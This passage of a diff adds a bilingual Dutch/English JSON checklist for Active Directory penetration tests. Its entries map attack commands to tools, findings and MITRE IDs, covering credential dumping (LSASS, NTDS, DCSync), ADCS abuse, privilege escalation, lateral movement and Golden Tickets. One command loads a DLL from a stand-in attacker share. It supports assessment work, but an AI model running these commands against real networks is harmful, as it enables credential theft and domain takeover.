+              "description": "Zoek accounts zonder Kerberos pre-authenticatie en crack de AS-REP hashes.",
+              "en_description": "Find accounts without Kerberos pre-authentication and crack AS-REP hashes.",
+              "commands": [
+                "Rubeus.exe asreproast /outfile:hashes.txt",
+                "GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC"
+              ],
+              "command_refs": [
+                "kerb_asreproast"
+              ],
+              "finding_refs": [
+                "AS-REP Roastable Account"
+              ],
+              "tools": [
+                "rubeus",
+                "impacket",
+                "hashcat"
+              ],
+              "mitre_attack": [
+                "T1558.004"
+              ]
+            },
+            {
+              "id": "int_cred_005",
+              "title": "LSASS dump",
+              "en_title": "LSASS Dump",
+              "description": "Dump LSASS-geheugen voor credentials via diverse methoden.",
+              "en_description": "Dump LSASS memory for credentials using various methods.",
+              "commands": [
+                "procdump.exe -ma lsass.exe lsass.dmp",
+                "rundll32.exe comsvcs.dll MiniDump PID lsass.dmp full"
+              ],
+              "command_refs": [
+                "cred_lsass_ppldump",
+                "cred_minidump"
+              ],
+              "finding_refs": [
+                "LSASS Credential Extraction"
+              ],
+              "tools": [
+                "procdump",
+                "mimikatz",
+                "pypykatz"
+              ],
+              "mitre_attack": [
+                "T1003.001"
+              ]
+            },
+            {
+              "id": "int_cred_006",
+              "title": "SAM dump",
+              "en_title": "SAM Dump",
+              "description": "Dump de lokale SAM-database voor lokale account hashes.",
+              "en_description": "Dump the local SAM database for local account hashes.",
+              "commands": [
+                "reg save HKLM\\SAM sam.bak",
+                "reg save HKLM\\SYSTEM system.bak",
+                "secretsdump.py -sam sam.bak -system system.bak LOCAL"
+              ],
+              "command_refs": [
+                "cred_sam_dump"
+              ],
+              "finding_refs": [
+                "Local Account Hash Extraction"
+              ],
+              "tools": [
+                "impacket",
+                "mimikatz"
+              ],
+              "mitre_attack": [
+                "T1003.002"
+              ]
+            },
+            {
+              "id": "int_cred_007",
+              "title": "NTDS dump",
+              "en_title": "NTDS Dump",
+              "description": "Dump de NTDS.dit database voor alle domein-hashes.",
+              "en_description": "Dump the NTDS.dit database for all domain hashes.",
+              "commands": [
+                "secretsdump.py DOMAIN/USER:PASS@DC",
+                "ntdsutil 'ac i ntds' 'ifm' 'create full c:\\temp' q q"
+              ],
+              "command_refs": [
+                "cred_ntds_dump"
+              ],
+              "finding_refs": [
+                "Domain Hash Extraction"
+              ],
+              "tools": [
+                "impacket",
+                "ntdsutil"
+              ],
+              "mitre_attack": [
+                "T1003.003"
+              ]
+            },
+            {
+              "id": "int_cred_008",
+              "title": "LAPS",
+              "en_title": "LAPS",
+              "description": "Lees LAPS-wachtwoorden als de huidige gebruiker de juiste rechten heeft.",
+              "en_description": "Read LAPS passwords if the current user has the right permissions.",
+              "commands": [
+                "Get-DomainComputer -Properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime"
+              ],
+              "command_refs": [
+                "cred_laps"
+              ],
+              "finding_refs": [
+                "LAPS Readable by Non-Admin"
+              ],
+              "tools": [
+                "powerview",
+                "crackmapexec"
+              ],
+              "mitre_attack": [
+                "T1552.006"
+              ]
+            },
+            {
+              "id": "int_cred_009",
+              "title": "gMSA",
+              "en_title": "gMSA",
+              "description": "Lees Group Managed Service Account wachtwoorden.",
+              "en_description": "Read Group Managed Service Account passwords.",
+              "commands": [
+                "Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword"
+              ],
+              "command_refs": [
+                "cred_gmsa"
+              ],
+              "finding_refs": [
+                "gMSA Password Readable"
+              ],
+              "tools": [
+                "powershell",
+                "gmsadumper"
+              ],
+              "mitre_attack": [
+                "T1552"
+              ]
+            },
+            {
+              "id": "int_cred_010",
+              "title": "CredSSP",
+              "en_title": "CredSSP",
+              "description": "Test op CredSSP-configuratie die credential-delegatie mogelijk maakt.",
+              "en_description": "Test for CredSSP configuration that enables credential delegation.",
+              "commands": [
+                "Get-WSManCredSSP"
+              ],
+              "command_refs": [
+                "cred_credssp"
+              ],
+              "finding_refs": [
+                "CredSSP Enabled"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1557"
+              ]
+            },
+            {
+              "id": "int_cred_011",
+              "title": "DPAPI extractie",
+              "en_title": "DPAPI Extraction",
+              "description": "Extraheer credentials beschermd door DPAPI (Wi-Fi, Vault, Credential Manager).",
+              "en_description": "Extract credentials protected by DPAPI (Wi-Fi, Vault, Credential Manager).",
+              "commands": [
+                "SharpDPAPI.exe triage",
+                "dpapi::masterkey /in:MASTERKEY /rpc"
+              ],
+              "command_refs": [
+                "cred_dpapi"
+              ],
+              "finding_refs": [
+                "DPAPI Credential Extraction"
+              ],
+              "tools": [
+                "sharpdpapi",
+                "mimikatz"
+              ],
+              "mitre_attack": [
+                "T1555.004"
+              ]
+            },
+            {
+              "id": "int_cred_012",
+              "title": "Browser credentials",
+              "en_title": "Browser Credentials",
+              "description": "Extraheer opgeslagen wachtwoorden en cookies uit webbrowsers.",
+              "en_description": "Extract saved passwords and cookies from web browsers.",
+              "commands": [
+                "SharpChrome.exe logins",
+                "SharpChrome.exe cookies"
+              ],
+              "command_refs": [
+                "cred_browser"
+              ],
+              "finding_refs": [
+                "Browser Credential Extraction"
+              ],
+              "tools": [
+                "sharpchrome",
+                "lazagne"
+              ],
+              "mitre_attack": [
+                "T1555.003"
+              ]
+            },
+            {
+              "id": "int_cred_013",
+              "title": "Cached credentials (DCC2)",
+              "en_title": "Cached Credentials (DCC2)",
+              "description": "Extraheer en crack cached domein-credentials (MSCash2/DCC2).",
+              "en_description": "Extract and crack cached domain credentials (MSCash2/DCC2).",
+              "commands": [
+                "lsadump::cache",
+                "hashcat -m 2100 hashes.txt wordlist.txt"
+              ],
+              "command_refs": [
+                "cred_cached_dcc2"
+              ],
+              "finding_refs": [
+                "Cached Credential Extraction"
+              ],
+              "tools": [
+                "mimikatz",
+                "impacket",
+                "hashcat"
+              ],
+              "mitre_attack": [
+                "T1003.005"
+              ]
+            },
+            {
+              "id": "int_cred_014",
+              "title": "SCCM credential extractie",
+              "en_title": "SCCM Credential Extraction",
+              "description": "Extraheer credentials uit SCCM/MECM Network Access Accounts en task sequences.",
+              "en_description": "Extract credentials from SCCM/MECM Network Access Accounts and task sequences.",
+              "commands": [
+                "SharpSCCM.exe local secrets -m wmi",
+                "SharpSCCM.exe get secrets"
+              ],
+              "command_refs": [
+                "cred_sccm_decrypt"
+              ],
+              "finding_refs": [
+                "SCCM Credential Exposure"
+              ],
+              "tools": [
+                "sharpsccm",
+                "sccmhunter"
+              ],
+              "mitre_attack": [
+                "T1552"
+              ]
+            },
+            {
+              "id": "int_cred_015",
+              "title": "Coercion & NTLM capture",
+              "en_title": "Coercion & NTLM Capture",
+              "description": "Forceer NTLM-authenticatie via PetitPotam, PrinterBug, ShadowCoerce of WebDAV naar een listener.",
+              "en_description": "Force NTLM authentication via PetitPotam, PrinterBug, ShadowCoerce or WebDAV to a listener.",
+              "commands": [
+                "PetitPotam.py LISTENER TARGET",
+                "SpoolSample.exe TARGET LISTENER",
+                "ShadowCoerce.py -d DOMAIN -u USER -p PASS LISTENER TARGET"
+              ],
+              "command_refs": [
+                "coerce_petitpotam",
+                "coerce_printerbug",
+                "coerce_shadowcoerce",
+                "coerce_webdav"
+              ],
+              "finding_refs": [
+                "NTLM Relay Possible",
+                "Coercion Attack"
+              ],
+              "tools": [
+                "petitpotam",
+                "spoolsample",
+                "shadowcoerce",
+                "responder"
+              ],
+              "mitre_attack": [
+                "T1187",
+                "T1557.001"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_privesc",
+          "title": "Privilege Escalation",
+          "items": [
+            {
+              "id": "int_privesc_001",
+              "title": "Lokale privesc check",
+              "en_title": "Local Privesc Check",
+              "description": "Voer geautomatiseerde privilege-escalatie checks uit.",
+              "en_description": "Run automated privilege escalation checks.",
+              "commands": [
+                "winpeas.exe",
+                "PowerUp.ps1 Invoke-AllChecks",
+                "SharpUp.exe audit"
+              ],
+              "command_refs": [
+                "enum_privesc_local"
+              ],
+              "finding_refs": [
+                "Local Privilege Escalation"
+              ],
+              "tools": [
+                "winpeas",
+                "powerup",
+                "sharpup"
+              ],
+              "mitre_attack": [
+                "T1068"
+              ]
+            },
+            {
+              "id": "int_privesc_002",
+              "title": "AlwaysInstallElevated",
+              "en_title": "AlwaysInstallElevated",
+              "description": "Controleer of AlwaysInstallElevated is ingeschakeld voor MSI privilege escalatie.",
+              "en_description": "Check if AlwaysInstallElevated is enabled for MSI privilege escalation.",
+              "commands": [
+                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+              ],
+              "command_refs": [
+                "privesc_alwaysinstall"
+              ],
+              "finding_refs": [
+                "AlwaysInstallElevated Enabled"
+              ],
+              "tools": [
+                "reg"
+              ],
+              "mitre_attack": [
+                "T1548"
+              ]
+            },
+            {
+              "id": "int_privesc_003",
+              "title": "UAC bypass",
+              "en_title": "UAC Bypass",
+              "description": "Bypass User Account Control via diverse technieken.",
+              "en_description": "Bypass User Account Control using various techniques.",
+              "commands": [],
+              "command_refs": [
+                "privesc_uac_bypass"
+              ],
+              "finding_refs": [
+                "UAC Bypass"
+              ],
+              "tools": [
+                "uacme"
+              ],
+              "mitre_attack": [
+                "T1548.002"
+              ]
+            },
+            {
+              "id": "int_privesc_004",
+              "title": "Token impersonation",
+              "en_title": "Token Impersonation",
+              "description": "Gebruik token impersonation voor privilege escalatie naar SYSTEM.",
+              "en_description": "Use token impersonation for privilege escalation to SYSTEM.",
+              "commands": [
+                "GodPotato.exe -cmd 'cmd /c whoami'",
+                "PrintSpoofer.exe -i -c cmd"
+              ],
+              "command_refs": [
+                "cred_token_impersonate"
+              ],
+              "finding_refs": [
+                "Token Impersonation Privilege Escalation"
+              ],
+              "tools": [
+                "godpotato",
+                "printspoofer",
+                "sweetpotato"
+              ],
+              "mitre_attack": [
+                "T1134.001"
+              ]
+            },
+            {
+              "id": "int_privesc_005",
+              "title": "ADCS ESC1",
+              "en_title": "ADCS ESC1",
+              "description": "Misbruik ADCS ESC1: template met enrollee-supplied subject en Client Authentication EKU.",
+              "en_description": "Abuse ADCS ESC1: template with enrollee-supplied subject and Client Authentication EKU.",
+              "commands": [
+                "certipy req -u USER@DOMAIN -p PASS -ca CA -template TEMPLATE -upn admin@DOMAIN"
+              ],
+              "command_refs": [
+                "adcs_esc1"
+              ],
+              "finding_refs": [
+                "ADCS ESC1 Misconfiguration"
+              ],
+              "tools": [
+                "certipy",
+                "certify"
+              ],
+              "mitre_attack": [
+                "T1649"
+              ]
+            },
+            {
+              "id": "int_privesc_006",
+              "title": "ADCS ESC4",
+              "en_title": "ADCS ESC4",
+              "description": "Misbruik ADCS ESC4: onvoldoende ACL op certificaat-template.",
+              "en_description": "Abuse ADCS ESC4: insufficient ACL on certificate template.",
+              "commands": [
+                "certipy template -u USER@DOMAIN -p PASS -template TEMPLATE -save-old"
+              ],
+              "command_refs": [
+                "adcs_esc4"
+              ],
+              "finding_refs": [
+                "ADCS ESC4 Misconfiguration"
+              ],
+              "tools": [
+                "certipy"
+              ],
+              "mitre_attack": [
+                "T1649"
+              ]
+            },
+            {
+              "id": "int_privesc_007",
+              "title": "ADCS ESC8",
+              "en_title": "ADCS ESC8",
+              "description": "Misbruik ADCS ESC8: NTLM relay naar HTTP-gebaseerde enrollment.",
+              "en_description": "Abuse ADCS ESC8: NTLM relay to HTTP-based enrollment.",
+              "commands": [
+                "certipy relay -ca CA",
+                "ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs"
+              ],
+              "command_refs": [
+                "adcs_esc8"
+              ],
+              "finding_refs": [
+                "ADCS ESC8 NTLM Relay"
+              ],
+              "tools": [
+                "certipy",
+                "ntlmrelayx"
+              ],
+              "mitre_attack": [
+                "T1649",
+                "T1557.001"
+              ]
+            },
+            {
+              "id": "int_privesc_008",
+              "title": "GenericAll abuse",
+              "en_title": "GenericAll Abuse",
+              "description": "Misbruik GenericAll-rechten op AD-objecten voor privilege escalatie.",
+              "en_description": "Abuse GenericAll permissions on AD objects for privilege escalation.",
+              "commands": [
+                "Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'Password1!' -AsPlainText -Force)"
+              ],
+              "command_refs": [
+                "ad_genericall"
+              ],
+              "finding_refs": [
+                "Excessive AD Permissions - GenericAll"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1222.001"
+              ]
+            },
+            {
+              "id": "int_privesc_009",
+              "title": "WriteDACL abuse",
+              "en_title": "WriteDACL Abuse",
+              "description": "Misbruik WriteDACL-rechten om AD-permissies te wijzigen.",
+              "en_description": "Abuse WriteDACL permissions to modify AD permissions.",
+              "commands": [
+                "Add-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=local' -PrincipalIdentity USER -Rights DCSync"
+              ],
+              "command_refs": [
+                "ad_writedacl"
+              ],
+              "finding_refs": [
+                "Excessive AD Permissions - WriteDACL"
+              ],
+              "tools": [
+                "powerview"
+              ],
+              "mitre_attack": [
+                "T1222.001"
+              ]
+            },
+            {
+              "id": "int_privesc_010",
+              "title": "GPO abuse",
+              "en_title": "GPO Abuse",
+              "description": "Misbruik GPO-bewerkingsrechten voor code-executie op domein-computers.",
+              "en_description": "Abuse GPO edit permissions for code execution on domain computers.",
+              "commands": [
+                "SharpGPOAbuse.exe --AddComputerTask --TaskName 'task' --Author 'DOMAIN\\admin' --Command 'cmd.exe' --Arguments '/c COMMAND' --GPOName 'GPO_NAME'"
+              ],
+              "command_refs": [
+                "ad_gpoddity"
+              ],
+              "finding_refs": [
+                "GPO Abuse"
+              ],
+              "tools": [
+                "sharpgpoabuse"
+              ],
+              "mitre_attack": [
+                "T1484.001"
+              ]
+            },
+            {
+              "id": "int_privesc_011",
+              "title": "WMI filter abuse",
+              "en_title": "WMI Filter Abuse",
+              "description": "Misbruik WMI-filter bewerkingsrechten voor GPO-manipulatie.",
+              "en_description": "Abuse WMI filter edit permissions for GPO manipulation.",
+              "commands": [],
+              "command_refs": [
+                "ad_wmi_filter_abuse"
+              ],
+              "finding_refs": [
+                "WMI Filter Abuse"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1047"
+              ]
+            },
+            {
+              "id": "int_privesc_012",
+              "title": "Constrained delegation",
+              "en_title": "Constrained Delegation",
+              "description": "Misbruik constrained delegation voor service-toegang via S4U-protocol.",
+              "en_description": "Abuse constrained delegation for service access via S4U protocol.",
+              "commands": [
+                "Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:admin /msdsspn:SERVICE/TARGET /ptt"
+              ],
+              "command_refs": [
+                "kerb_constrained"
+              ],
+              "finding_refs": [
+                "Constrained Delegation Abuse"
+              ],
+              "tools": [
+                "rubeus",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1550.003"
+              ]
+            },
+            {
+              "id": "int_privesc_013",
+              "title": "WriteOwner abuse",
+              "en_title": "WriteOwner Abuse",
+              "description": "Misbruik WriteOwner-rechten om eigenaar te worden van AD-objecten en permissies te wijzigen.",
+              "en_description": "Abuse WriteOwner permissions to take ownership of AD objects and modify permissions.",
+              "commands": [
+                "Set-DomainObjectOwner -Identity TARGET -OwnerIdentity USER",
+                "Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity USER -Rights All"
+              ],
+              "command_refs": [
+                "ad_writeowner"
+              ],
+              "finding_refs": [
+                "Excessive AD Permissions - WriteOwner"
+              ],
+              "tools": [
+                "powerview",
+                "bloodyad"
+              ],
+              "mitre_attack": [
+                "T1222.001"
+              ]
+            },
+            {
+              "id": "int_privesc_014",
+              "title": "AddMember abuse",
+              "en_title": "AddMember Abuse",
+              "description": "Misbruik AddMember/Self-rechten om gebruikers toe te voegen aan privileged groepen.",
+              "en_description": "Abuse AddMember/Self permissions to add users to privileged groups.",
+              "commands": [
+                "Add-DomainGroupMember -Identity 'Domain Admins' -Members USER",
+                "net group 'Domain Admins' USER /add /domain"
+              ],
+              "command_refs": [
+                "ad_addmember"
+              ],
+              "finding_refs": [
+                "Excessive AD Permissions - AddMember"
+              ],
+              "tools": [
+                "powerview",
+                "net"
+              ],
+              "mitre_attack": [
+                "T1098"
+              ]
+            },
+            {
+              "id": "int_privesc_015",
+              "title": "DNSAdmins abuse",
+              "en_title": "DNSAdmins Abuse",
+              "description": "Misbruik DNSAdmins-groepslidmaatschap voor DLL-injectie in de DNS-service op de DC.",
+              "en_description": "Abuse DNSAdmins group membership for DLL injection into the DNS service on the DC.",
+              "commands": [
+                "dnscmd DC /config /serverlevelplugindll \\\\ATTACKER\\share\\evil.dll",
+                "sc \\\\DC stop dns && sc \\\\DC start dns"
+              ],
+              "command_refs": [
+                "ad_dnsadmins"
+              ],
+              "finding_refs": [
+                "DNSAdmins Privilege Escalation"
+              ],
+              "tools": [
+                "dnscmd",
+                "msfvenom"
+              ],
+              "mitre_attack": [
+                "T1574"
+              ]
+            },
+            {
+              "id": "int_privesc_016",
+              "title": "Shadow Credentials",
+              "en_title": "Shadow Credentials",
+              "description": "Misbruik msDS-KeyCredentialLink voor PKINIT-authenticatie als het doelobject.",
+              "en_description": "Abuse msDS-KeyCredentialLink for PKINIT authentication as the target object.",
+              "commands": [
+                "Whisker.exe add /target:TARGET$",
+                "pywhisker -d DOMAIN -u USER -p PASS --target TARGET$ --action add"
+              ],
+              "command_refs": [
+                "ad_shadow_credentials"
+              ],
+              "finding_refs": [
+                "Shadow Credentials Attack"
+              ],
+              "tools": [
+                "whisker",
+                "pywhisker",
+                "rubeus"
+              ],
+              "mitre_attack": [
+                "T1556"
+              ]
+            },
+            {
+              "id": "int_privesc_017",
+              "title": "noPac / SAMAccountName spoof",
+              "en_title": "noPac / SAMAccountName Spoofing",
+              "description": "Misbruik CVE-2021-42278/CVE-2021-42287 (noPac) voor directe Domain Admin escalatie.",
+              "en_description": "Abuse CVE-2021-42278/CVE-2021-42287 (noPac) for direct Domain Admin escalation.",
+              "commands": [
+                "noPac.exe scan -domain DOMAIN -user USER -pass PASS",
+                "noPac.exe -domain DOMAIN -user USER -pass PASS /dc DC /mAccount FAKE$ /mPassword PASS /service cifs /ptt"
+              ],
+              "command_refs": [
+                "ad_nopac"
+              ],
+              "finding_refs": [
+                "noPac Vulnerability"
+              ],
+              "tools": [
+                "nopac",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1068"
+              ]
+            },
+            {
+              "id": "int_privesc_018",
+              "title": "KrbRelayUp",
+              "en_title": "KrbRelayUp",
+              "description": "Lokale privilege-escalatie via Kerberos relay (RBCD of Shadow Credentials) zonder netwerktoegang.",
+              "en_description": "Local privilege escalation via Kerberos relay (RBCD or Shadow Credentials) without network access.",
+              "commands": [
+                "KrbRelayUp.exe relay -m rbcd -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}",
+                "KrbRelayUp.exe spawn -m rbcd -d DOMAIN -dc DC -cn FAKE$"
+              ],
+              "command_refs": [
+                "coerce_krbrelayup"
+              ],
+              "finding_refs": [
+                "KrbRelayUp Privilege Escalation"
+              ],
+              "tools": [
+                "krbrelayup"
+              ],
+              "mitre_attack": [
+                "T1557"
+              ]
+            },
+            {
+              "id": "int_privesc_019",
+              "title": "ADCS ESC15",
+              "en_title": "ADCS ESC15",
+              "description": "Misbruik ADCS ESC15: Application Policy OID mismatches in certificate templates.",
+              "en_description": "Abuse ADCS ESC15: Application Policy OID mismatches in certificate templates.",
+              "commands": [
+                "certipy find -u USER@DOMAIN -p PASS -dc-ip DC -vulnerable"
+              ],
+              "command_refs": [
+                "adcs_esc15"
+              ],
+              "finding_refs": [
+                "ADCS ESC15 Misconfiguration"
+              ],
+              "tools": [
+                "certipy"
+              ],
+              "mitre_attack": [
+                "T1649"
+              ]
+            },
+            {
+              "id": "int_privesc_020",
+              "title": "ADCS ESC16",
+              "en_title": "ADCS ESC16",
+              "description": "Misbruik ADCS ESC16: Security Extension bypass via GenericWrite op user-objecten.",
+              "en_description": "Abuse ADCS ESC16: Security Extension bypass via GenericWrite on user objects.",
+              "commands": [
+                "certipy account update -u USER@DOMAIN -p PASS -user TARGET -upn admin@DOMAIN"
+              ],
+              "command_refs": [
+                "adcs_esc16"
+              ],
+              "finding_refs": [
+                "ADCS ESC16 Misconfiguration"
+              ],
+              "tools": [
+                "certipy"
+              ],
+              "mitre_attack": [
+                "T1649"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_lateral",
+          "title": "Lateral Movement",
+          "items": [
+            {
+              "id": "int_lateral_001",
+              "title": "WMI executie",
+              "en_title": "WMI Execution",
+              "description": "Voer laterale beweging uit via WMI (Windows Management Instrumentation).",
+              "en_description": "Perform lateral movement via WMI (Windows Management Instrumentation).",
+              "commands": [
+                "wmiexec.py DOMAIN/USER:PASS@TARGET",
+                "Invoke-WMIExec -Target TARGET -Username USER -Hash HASH -Command COMMAND"
+              ],
+              "command_refs": [
+                "lateral_wmi"
+              ],
+              "finding_refs": [
+                "Lateral Movement via WMI"
+              ],
+              "tools": [
+                "impacket",
+                "crackmapexec"
+              ],
+              "mitre_attack": [
+                "T1047"
+              ]
+            },
+            {
+              "id": "int_lateral_002",
+              "title": "PSRemoting",
+              "en_title": "PSRemoting",
+              "description": "Gebruik PowerShell Remoting voor laterale beweging naar andere hosts.",
+              "en_description": "Use PowerShell Remoting for lateral movement to other hosts.",
+              "commands": [
+                "Enter-PSSession -ComputerName TARGET",
+                "Invoke-Command -ComputerName TARGET -ScriptBlock {whoami}"
+              ],
+              "command_refs": [
+                "lateral_psremoting"
+              ],
+              "finding_refs": [
+                "Lateral Movement via PSRemoting"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1021.006"
+              ]
+            },
+            {
+              "id": "int_lateral_003",
+              "title": "DCOM",
+              "en_title": "DCOM",
+              "description": "Gebruik DCOM (Distributed COM) objecten voor laterale beweging.",
+              "en_description": "Use DCOM (Distributed COM) objects for lateral movement.",
+              "commands": [
+                "$obj = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET'))"
+              ],
+              "command_refs": [
+                "lateral_dcom"
+              ],
+              "finding_refs": [
+                "Lateral Movement via DCOM"
+              ],
+              "tools": [
+                "powershell"
+              ],
+              "mitre_attack": [
+                "T1021.003"
+              ]
+            },
+            {
+              "id": "int_lateral_004",
+              "title": "WinRM",
+              "en_title": "WinRM",
+              "description": "Gebruik WinRM voor laterale beweging via Evil-WinRM of PowerShell.",
+              "en_description": "Use WinRM for lateral movement via Evil-WinRM or PowerShell.",
+              "commands": [
+                "evil-winrm -i TARGET -u USER -p PASS",
+                "winrs -r:TARGET cmd"
+              ],
+              "command_refs": [
+                "lateral_winrm"
+              ],
+              "finding_refs": [
+                "Lateral Movement via WinRM"
+              ],
+              "tools": [
+                "evil-winrm",
+                "winrs"
+              ],
+              "mitre_attack": [
+                "T1021.006"
+              ]
+            },
+            {
+              "id": "int_lateral_005",
+              "title": "SMB executie",
+              "en_title": "SMB Execution",
+              "description": "Voer commando's uit via SMB met behulp van PsExec of smbexec.",
+              "en_description": "Execute commands via SMB using PsExec or smbexec.",
+              "commands": [
+                "psexec.py DOMAIN/USER:PASS@TARGET",
+                "smbexec.py DOMAIN/USER:PASS@TARGET"
+              ],
+              "command_refs": [
+                "evasion_smb_exec",
+                "lateral_smbexec",
+                "lateral_psexec"
+              ],
+              "finding_refs": [
+                "Lateral Movement via SMB"
+              ],
+              "tools": [
+                "impacket",
+                "psexec"
+              ],
+              "mitre_attack": [
+                "T1021.002"
+              ]
+            },
+            {
+              "id": "int_lateral_006",
+              "title": "SCM",
+              "en_title": "SCM",
+              "description": "Gebruik Service Control Manager voor remote service-creatie en executie.",
+              "en_description": "Use Service Control Manager for remote service creation and execution.",
+              "commands": [
+                "sc \\\\TARGET create svc binpath= 'cmd /c COMMAND'",
+                "sc \\\\TARGET start svc"
+              ],
+              "command_refs": [
+                "lateral_scm"
+              ],
+              "finding_refs": [
+                "Lateral Movement via SCM"
+              ],
+              "tools": [
+                "sc"
+              ],
+              "mitre_attack": [
+                "T1569.002"
+              ]
+            },
+            {
+              "id": "int_lateral_007",
+              "title": "Pass the Hash / Overpass the Hash",
+              "en_title": "Pass the Hash / Overpass the Hash",
+              "description": "Gebruik NTLM-hashes of Kerberos-tickets voor authenticatie zonder wachtwoord.",
+              "en_description": "Use NTLM hashes or Kerberos tickets for authentication without password.",
+              "commands": [
+                "Rubeus.exe asktgt /user:USER /rc4:HASH /ptt",
+                "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd"
+              ],
+              "command_refs": [
+                "kerb_opth"
+              ],
+              "finding_refs": [
+                "Pass the Hash"
+              ],
+              "tools": [
+                "rubeus",
+                "mimikatz",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1550.002"
+              ]
+            },
+            {
+              "id": "int_lateral_008",
+              "title": "Chisel tunneling",
+              "en_title": "Chisel Tunneling",
+              "description": "Gebruik Chisel voor netwerk-tunneling en port forwarding.",
+              "en_description": "Use Chisel for network tunneling and port forwarding.",
+              "commands": [
+                "chisel server -p 8080 --reverse",
+                "chisel client IP:8080 R:socks"
+              ],
+              "command_refs": [
+                "net_chisel_tunnel"
+              ],
+              "finding_refs": [],
+              "tools": [
+                "chisel"
+              ],
+              "mitre_attack": [
+                "T1572"
+              ]
+            },
+            {
+              "id": "int_lateral_009",
+              "title": "atexec / Task Scheduler",
+              "en_title": "atexec / Task Scheduler",
+              "description": "Gebruik Scheduled Tasks voor remote command-executie via impacket atexec.",
+              "en_description": "Use Scheduled Tasks for remote command execution via impacket atexec.",
+              "commands": [
+                "atexec.py DOMAIN/USER:PASS@TARGET 'whoami'",
+                "schtasks /create /s TARGET /tn task /tr 'cmd /c COMMAND' /sc once /st 00:00 /ru SYSTEM"
+              ],
+              "command_refs": [
+                "lateral_atexec"
+              ],
+              "finding_refs": [
+                "Lateral Movement via Task Scheduler"
+              ],
+              "tools": [
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1053.005"
+              ]
+            },
+            {
+              "id": "int_lateral_010",
+              "title": "NTLM relay",
+              "en_title": "NTLM Relay",
+              "description": "Relay onderschepte NTLM-authenticatie naar andere services (SMB, LDAP, HTTP) voor code-executie of privilege escalatie.",
+              "en_description": "Relay intercepted NTLM authentication to other services (SMB, LDAP, HTTP) for code execution or privilege escalation.",
+              "commands": [
+                "ntlmrelayx.py -t TARGET -smb2support",
+                "ntlmrelayx.py -t ldaps://DC --delegate-access"
+              ],
+              "command_refs": [
+                "lateral_ntlmrelay"
+              ],
+              "finding_refs": [
+                "NTLM Relay Possible",
+                "SMB Signing Not Required"
+              ],
+              "tools": [
+                "impacket",
+                "responder"
+              ],
+              "mitre_attack": [
+                "T1557.001"
+              ]
+            },
+            {
+              "id": "int_lateral_011",
+              "title": "SCShell (fileless)",
+              "en_title": "SCShell (Fileless)",
+              "description": "Gebruik SCShell voor fileless laterale beweging via service-configuratie wijzigingen.",
+              "en_description": "Use SCShell for fileless lateral movement via service configuration changes.",
+              "commands": [
+                "SCShell.exe TARGET XblAuthManager C:\\Windows\\System32\\cmd.exe /c COMMAND DOMAIN USER PASS"
+              ],
+              "command_refs": [
+                "lateral_scshell"
+              ],
+              "finding_refs": [
+                "Fileless Lateral Movement"
+              ],
+              "tools": [
+                "scshell"
+              ],
+              "mitre_attack": [
+                "T1569.002"
+              ]
+            },
+            {
+              "id": "int_lateral_012",
+              "title": "SCCM deployment abuse",
+              "en_title": "SCCM Deployment Abuse",
+              "description": "Misbruik SCCM/MECM voor applicatie-deployment naar andere systemen als laterale beweging.",
+              "en_description": "Abuse SCCM/MECM for application deployment to other systems as lateral movement.",
+              "commands": [
+                "SharpSCCM.exe exec -p PAYLOAD -r TARGET",
+                "sccmhunter admin -u USER -p PASS -ip TARGET"
+              ],
+              "command_refs": [
+                "lateral_sccm_deploy"
+              ],
+              "finding_refs": [
+                "SCCM Deployment Abuse"
+              ],
+              "tools": [
+                "sharpsccm",
+                "sccmhunter"
+              ],
+              "mitre_attack": [
+                "T1072"
+              ]
+            }
+          ]
+        },
+        {
+          "id": "int_domdom",
+          "title": "Domain Dominance",
+          "items": [
+            {
+              "id": "int_domdom_001",
+              "title": "DCSync",
+              "en_title": "DCSync",
+              "description": "Gebruik DCSync om wachtwoord-hashes van de domeincontroller te repliceren.",
+              "en_description": "Use DCSync to replicate password hashes from the domain controller.",
+              "commands": [
+                "secretsdump.py DOMAIN/USER:PASS@DC",
+                "lsadump::dcsync /domain:DOMAIN /user:krbtgt"
+              ],
+              "command_refs": [
+                "ad_dcsync"
+              ],
+              "finding_refs": [
+                "DCSync Attack Possible"
+              ],
+              "tools": [
+                "impacket",
+                "mimikatz"
+              ],
+              "mitre_attack": [
+                "T1003.006"
+              ]
+            },
+            {
+              "id": "int_domdom_002",
+              "title": "Golden Ticket",
+              "en_title": "Golden Ticket",
+              "description": "Maak een Golden Ticket met de krbtgt-hash voor onbeperkte domeintoegang.",
+              "en_description": "Create a Golden Ticket with the krbtgt hash for unrestricted domain access.",
+              "commands": [
+                "kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt"
+              ],
+              "command_refs": [
+                "kerb_golden_ticket"
+              ],
+              "finding_refs": [
+                "Golden Ticket Attack"
+              ],
+              "tools": [
+                "mimikatz",
+                "rubeus",
+                "impacket"
+              ],
+              "mitre_attack": [
+                "T1558.001"
+              ]
+            },
+            {
+              "id": "int_domdom_003",
+              "title": "Silver Ticket",
+              "en_title": "Silver Ticket",
